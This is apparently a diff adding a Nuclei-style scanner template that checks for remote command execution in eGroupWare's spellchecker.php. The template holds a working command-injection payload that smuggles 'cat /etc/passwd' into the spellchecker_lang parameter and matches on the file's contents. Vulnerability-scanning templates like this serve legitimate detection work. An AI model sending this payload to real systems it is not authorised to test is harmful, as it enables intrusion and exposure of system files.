@@ -1,0 +1,21 @@
+id: egroupware-spellchecker-php-rce
+info:
+  name: eGroupWare Spellchecker.php Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,egroupware
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/egroupware/phpgwapi/js/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php?spellchecker_lang=egroupware_spellchecker_cmd_exec.nasl%7C%7Ccat+/etc/passwd%7C%7C"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+          - "error = "
